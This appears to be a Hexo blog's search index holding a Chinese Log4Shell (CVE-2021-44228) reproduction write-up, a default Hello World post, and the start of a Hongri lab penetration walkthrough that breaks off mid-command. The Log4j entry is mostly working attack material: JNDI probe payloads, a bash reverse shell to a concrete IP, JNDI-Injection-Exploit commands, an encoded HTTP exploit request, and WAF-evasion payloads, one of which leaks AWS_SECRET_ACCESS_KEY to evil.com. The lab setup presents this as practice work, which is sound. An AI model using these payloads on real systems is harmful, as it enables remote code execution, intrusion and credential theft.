<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>cve-2021-44228-Log4j2</title>
    <url>/post/f9f48cab.html</url>
    <content><![CDATA[cve-2021-44228-Log4j2
利用到的工具

JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

JNDIExploit-2.0-SNAPSHOT.jar
一台vps



log4j2
cve-2021-44228
利用
##### 探测是否存在漏洞

先获取一个DNS的地址
#探测是否存在漏洞$&#123;jndi:ldap://123.7k8ovf.ceye.io&#125;#获取版本$&#123;jndi:ldap://$&#123;sys:java.version&#125;.7k8ovf.ceye.io&#125;





dns平台回显

java版本为
1.8.0_312



getshell在vps开个监听
nc -lvnp 4444




bash -i &gt;&amp; /dev/tcp/47.113.229.136/4444 0&gt;&amp;1


YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE&#x3D;
base64编码一下
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;47.113.229.136&quot;




由于版本为1.8
所以选择
ldap:&#x2F;&#x2F;47.113.229.136:1389&#x2F;hozkka
$&#123;jndi:ldap://47.113.229.136:1389/hozkka&#125;






记得把服务器的安全组规则弄一下
端口开放一下

应该能弹shell成功的 但是太卡了
这里是用的在线靶场
$&#123;jndi:ldap://47.113.229.136:1389/TomcatBypass/TomcatEcho&#125;GET /hello?payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%34%37%2e%31%31%33%2e%32%32%39%2e%31%33%36%3a%31%33%38%39%2f%54%6f%6d%63%61%74%42%79%70%61%73%73%2f%54%6f%6d%63%61%74%45%63%68%6f%7d HTTP/1.1Host: 123.58.224.8:20060Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://123.58.224.8:11324/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9cmd: ls /tmp




绕waf
Log4j2混淆绕过waf/流量特征
[Log4j一些WAF绕过技巧 - websec80 - 博客园](https://www.cnblogs.com/websec80/p/17876672.html)

利用 Lookup 语法变形
1.可以使用 :- 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字


:- 的作用是用来指定一个默认值。当 lookup 函数找不到指定的变量或值时，它会返回 :- 后面指定的默认值。

s[:::::-j)${what:-n}${ls:-d}${1QAZ2wxs:-i}
${j${sdasd:-n}d${sddd:-i}:ldap:&#x2F;&#x2F;dns.log}
环境变量与系统属性注入
**环境变量读取**：利用 `env` Lookup 动态构造 Payload，例如：


java复制

$&#123;jndi:ldap://evil.com/z?leak=$&#123;env:AWS_SECRET_ACCESS_KEY&#125;&#125;$&#123;$&#123;env:ENV_NAME:-j&#125;ndi:$&#123;env:ENV_NAME:-l&#125;dap://evil.com/z&#125;

通过读取环境变量或动态拼接绕过静态检测7。
系统属性注入：利用 sys Lookup 构造动态协议：
$&#123;jnd$&#123;sys:SYS_NAME:-i&#125;:ldap://evil.com/z&#125;

若系统属性 SYS_NAME 不存在，则默认使用 i 补全7。
2.虽然除了JNDI之外的核心包里的Lookup不能直接用来执行恶意代码，但是可以获取系统信息、环境变量、属性配置、JVM参数等等信息，这些信息可以被攻击者用来进行下一步操作
解析绕过
$&#123;jndi:ldap://127.0.0.1#evil.com/z&#125;  // 利用 `#` 分割主机名$&#123;jndi:ldap://127.0.0.1`/Exploit&#125;    // 使用反引号触发 URI 解析错误&#123;  &quot;payload&quot;: &quot;$&#123;jnd$&#123;a&quot;:&quot;a:-i&#125;:ld$&#123;&quot;,  &quot;next&quot;: &quot;o:-a&#125;p://evil.com/z&#125;&quot;&#125;

]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/post/4a17b156.html</url>
    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
Quick StartCreate a new post$ hexo new &quot;My New Post&quot;

More info: Writing
Run server$ hexo server

More info: Server
Generate static files$ hexo generate

More info: Generating
Deploy to remote sites$ hexo deploy

More info: Deployment
]]></content>
  </entry>
  <entry>
    <title>红日1</title>
    <url>/post/633b4305.html</url>
    <content><![CDATA[环境搭建
安装好三台靶机



默认密码为
hongrisec@2019
配置两张网卡  NAT和vm1


查看网卡配置成功
配置kali（vps）
一张网卡，NAT模拟公网

192.168.5.129
配置win7（web服务器跳板机）
(NAT、VMnet1- 52.0/24)



改密码为hongrisec@2025
首次登录成功后，需要进行重启，否则phpstudy可能启动不了


配置成功
cmd检查一下，如果这里没显示两个不同网段的ip，那么就去修改网卡，直到成功为止
这里注意 第一个网卡固定为192.168.52.0&#x2F;24
所以将网卡2改为NAT以模拟外网


域内主机 Win2k3（VMnet3- 52.141）
显示要修改密码

修改为hongrisec@2025


域控 Server 2008 R2（VMnet3 - 52.138）
同样需要修改密码

修改为hongrisec@2025

环境
同下 配置成功


模拟外网网段：192.168.5.0&#x2F;24
模拟内网网段：192.168.52.0&#x2F;24
攻击机
win11:192.168.5.1
kali:192.168.5.129
信息收集
`fs.exe -h 192.168.5.130-255`#这里这么扫是因为避开扫kali和物理机，正常应该为xxx.xxx.xxx.0/24


端口
192.168.5.130:80 open
192.168.5.130:3306 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://192.168.72.128     code:200 len:14749  title:phpStudy 探针 2014
外网打点
访问80端口为phpinfo



尝试弱口令root和root，成功连接

使用工具直接连 连不上
dirsearch 扫一下目录
python dirsearch.py -u “]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
</search>
